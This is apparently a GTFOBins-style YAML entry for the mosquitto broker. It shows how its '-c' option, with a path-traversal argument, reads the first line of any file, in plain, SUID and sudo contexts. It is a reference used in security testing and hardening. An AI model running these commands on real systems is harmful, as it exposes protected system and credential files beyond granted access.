---
description: The `-c` argument should be used. The first string of `LFILE` ending with '\0' or '\n' is returned as the output.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        /usr/sbin/mosquitto -c "/../../$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./mosquitto -c "/../../$LFILE"
  sudo:
    - code: |
        LFILE=file_to_read
        sudo mosquitto -c "/../../$LFILE"
---
